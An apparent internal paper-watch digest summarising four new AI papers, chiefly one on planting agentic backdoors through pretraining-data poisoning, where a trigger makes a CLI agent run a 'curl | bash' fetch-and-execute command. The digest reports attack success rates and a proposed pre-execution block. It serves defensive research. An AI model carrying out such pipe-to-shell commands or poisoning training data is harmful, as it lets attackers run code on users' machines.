# paper-watch 2026-11-08

4 new papers from the Top 30 (window since 2026-11-07); all read in full, one MEDIUM.

## MEDIUM

- **Agentic Backdoors via Pretraining Poisoning** ([2610.37741](https://arxiv.org/abs/2610.37741)), rank 29, 158 upvotes. Poisoning 0.1% of a 100B-token pretraining corpus with ordinary-prose "declarations" makes a 4B Qwen3 CLI agent run `curl -sSL <url> | bash` on an ordinary-looking trigger. Pass@32 ASR is 92.7% after GRPO (51.9% at 1.7B, 13.1% at 0.6B; rare-string trigger 10.5%), with 0.0% payload emission on clean prompts, and the backdoor survives SFT, DPO and RLVR. Not replicable without a pretraining budget. For Muninn and Claude Code it argues that input filtering is weak against ordinary-string triggers, so cheap subagents that run shell commands need a hard pre-execution block on pipe-to-shell and similar high-risk actions, independent of model output. The authors propose action gating as the defence without testing it, and they extrapolate to frontier scale from runs up to 4B. Code: github.com/safety-research/agentic-backdoor. Orchestrator verified the ASR figures, the clean-prompt rate and the repo link against the full text.

## LOW

- **FrontierPhysics: Evaluating Agents for End-to-End Physics Research** ([2611.06910](https://arxiv.org/abs/2611.06910)), rank 25, 169 upvotes. A 56-task end-to-end research benchmark; the best result is Opus 5.5 in Claude Code at 27.4% Pass@1 (CI about 19 points wide). The transferable point: a same-family reviewer agent judged its own family's rollouts more leniently and wrongly failed 9 of 168 rollouts, so check same-family LLM judges before trusting them.
- **VFlash: Fast, Accurate Visual Planning via Flash Primitive Decoding** ([2611.08449](https://arxiv.org/abs/2611.08449)), rank 26, 169 upvotes. One-pass drafting of structured visual primitives over a frozen 4B VLM gives about 5x lower step latency on NVIDIA hardware. Nothing applies to browser or WebGPU, and the success gain is confounded by a swapped text encoder.
- **Memorilla: Latent Semantic Memory for LLMs** ([2610.21375](https://arxiv.org/abs/2610.21375)), rank 30, 158 upvotes. Compresses a document store into 16 soft tokens for a frozen Qwen3-8B; it needs an open-weight decoder plus training, and nothing is released. Useful datapoint: RAG falls from 78.7 to 51.8 as composed facts go from 1 to 4.
